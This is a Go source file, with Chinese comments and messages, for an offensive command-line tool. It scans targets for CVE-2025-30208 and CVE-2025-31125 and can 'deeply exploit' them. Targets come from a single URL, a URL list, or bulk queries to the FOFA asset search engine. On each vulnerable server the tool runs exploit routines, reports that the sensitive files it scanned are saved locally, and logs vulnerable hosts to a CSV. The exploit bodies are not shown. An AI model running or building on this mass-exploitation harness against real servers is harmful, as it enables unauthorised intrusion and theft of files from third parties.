package main

import (
	"bufio"
	"encoding/csv"
	"flag"
	"fmt"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	CVE      string
	NeedFofa bool
	Url      string
	FileName string
	Exploit  bool
)

func init() {
	flag.StringVar(&CVE, "cve", "cve-2025-30208", "使用哪个cve漏洞进行检测。支持CVE_2025_30208和CVE_2025_31125。")
	flag.BoolVar(&NeedFofa, "fofa", false, "确认是否需要fofa")
	flag.StringVar(&Url, "url", "", "检测存在漏洞的url")
	flag.StringVar(&Url, "u", "", "检测存在漏洞的url")
	flag.StringVar(&FileName, "filename", "", "批量检测文件")
	flag.StringVar(&FileName, "f", "", "批量检测文件")
	flag.BoolVar(&Exploit, "e", false, "是否深度利用漏洞(谨慎使用)")
	flag.Parse()
}

// 为url添加http://和https://，并检查url合法性，顺便检测是否存活
func NormalizeUrl(targetUrl string) (Target, bool) {
	targetUrl = strings.Trim(targetUrl, "/")
	Port := ""
	if !strings.HasPrefix(targetUrl, "http://") && !strings.HasPrefix(targetUrl, "https://") {
		httpTargetUrl := "http://" + targetUrl
		u, err := url.Parse(httpTargetUrl)
		if err == nil {
			request, err := Request(httpTargetUrl)
			if err == nil {
				defer request.Body.Close()
				Port = u.Port()
				if Port == "" {
					Port = "80"
				}
				return Target{
					HOST:       u.Host,
					IP:         u.Host,
					Port:       Port,
					Protocal:   u.Scheme,
					Url:        httpTargetUrl,
					StatusCode: request.StatusCode,
				}, true
			}
		}
		httpsTargetUrl := "https://" + targetUrl
		u2, err := url.Parse("https://" + targetUrl)
		if err != nil {
			return Target{}, false
		}
		request2, err := Request(httpsTargetUrl)
		if err != nil {
			return Target{}, false
		}
		defer request2.Body.Close()
		Port = u.Port()
		if Port == "" {
			Port = "443"
		}
		return Target{
			HOST:       u2.Host,
			IP:         u2.Host,
			Port:       Port,
			Protocal:   u2.Scheme,
			Url:        httpsTargetUrl,
			StatusCode: request2.StatusCode,
		}, true
	}
	u, err := url.Parse(targetUrl)
	if err != nil {
		return Target{}, false
	}
	request, err := Request(targetUrl)
	if err != nil {
		return Target{}, false
	}
	defer request.Body.Close()
	if Port == "" {
		if strings.HasPrefix(targetUrl, "http://") {
			Port = "80"
		} else {
			Port = "443"
		}
	}
	return Target{
		HOST:       u.Host,
		IP:         u.Host,
		Port:       Port,
		Protocal:   u.Scheme,
		Url:        targetUrl,
		StatusCode: request.StatusCode,
	}, true
}

func SaveResult(successList []Target) {
	fileName2 := fmt.Sprintf("%d", time.Now().Unix()) + ".csv"
	file2, err := os.Create(fileName2)
	if err != nil {
		ERROR("[-] 未能成功将结果输出到文件中！")
		os.Exit(1)
	}
	defer file2.Close()
	writer := csv.NewWriter(file2)
	defer writer.Flush()
	writer.Write([]string{"IP", "PORT", "URL", "Protocal", "Platform", "RootPath"})
	for _, result := range successList {
		writer.Write([]string{result.IP, result.Port, result.Url, result.Protocal, result.Platform, result.RootPath})
	}
	SUCCESS("[+] 成功将结果写入到%s文件中", fileName2)
}

func (target *Target) CheckAndExploit() bool {
	platform, vul, sep := "", false, ""
	if CVE == "cve-2025-30208" {
		platform, vul = target.check_CVE_2025_30208(sep)

	} else {
		platform, vul = target.check_CVE_2025_31125(sep)
		if !vul {
			sep = "/@fs"
			platform, vul = target.check_CVE_2025_31125(sep)
		}
	}
	if vul {
		SUCCESS("[+] 目标是%s平台, %s存在%s漏洞！\n", platform, target.Url, CVE)
		if Exploit {
			if CVE == "cve-2025-30208" {
				ok, err := target.exploit_CVE_2025_30208(sep)
				if !ok {
					ERROR("[-]利用漏洞%s失败！%s\n", CVE, err)
					return vul
				}
				SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下\n", target.HOST)
			} else {
				ok, err := target.exploit_CVE_2025_31125(sep)
				if !ok {
					ERROR("[-]利用漏洞%s失败！%s\n", CVE, err)
					return vul
				}
				SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下\n", target.HOST)
			}
		}
	} else {
		ERROR("[-] %s貌似不存在%s漏洞！\n", target.Url, CVE)
	}
	return vul
}

func main() {
	if Url == "" && NeedFofa == false && FileName == "" {
		ERROR("[-] 请至少输入-u/-url|-fofa|-filename/-f等参数\n")
		flag.Usage()
		os.Exit(1)
	}
	CVE = strings.ToLower(CVE)
	cveOptions := map[string]struct{}{
		"cve-2025-30208": {},
		"cve-2025-31125": {},
	}
	if _, ok := cveOptions[CVE]; !ok {
		ERROR("[-] 对于CVE参数，请输入cve-2025-30208或者cve-2025-31125\n")
		flag.Usage()
		os.Exit(1)
	}
	if !NeedFofa {
		// 不用fofa的话，就是检测给定的一个url或者是批量检测给定文件名中的url
		if Url != "" {
			target, ok := NormalizeUrl(Url)
			if !ok {
				ERROR("[-] 请检查输入的url：%s是否正确！\n", Url)
				os.Exit(1)
			}
			target.CheckAndExploit()
		}
		if FileName != "" {
			file, err := os.Open(FileName)
			if err != nil {
				ERROR("[-] 打开文件 %s 失败：%s。\n", FileName, err.Error())
				os.Exit(1)
			}
			defer file.Close()
			successList := []Target{}
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				Url := scanner.Text()
				if Url == "" {
					continue // 处理空行
				}
				target, ok := NormalizeUrl(Url)
				if !ok {
					ERROR("[-] 请检查url：%s是否正确！\n", Url)
					continue
				}
				vul := target.CheckAndExploit()
				if vul {
					successList = append(successList, target)
				}
			}
			if len(successList) != 0 {
				SaveResult(successList)
			}
		}
	} else {
		// 联动fofa进行检测， 先从fofa中取出相应的目标资产，然后检测存活度、去重，最终利用相应的cve进行批量检测
		var assets []Target
		assets, err := GetFofaAssets()
		if err != nil {
			ERROR("[-] 出现了错误: %s\n", err.Error())
			os.Exit(1)
		}
		var successList []Target
		for _, asset := range assets {
			vul := asset.CheckAndExploit()
			if vul {
				successList = append(successList, asset)
			}
		}
		if len(successList) != 0 {
			SaveResult(successList)
		}
	}
}
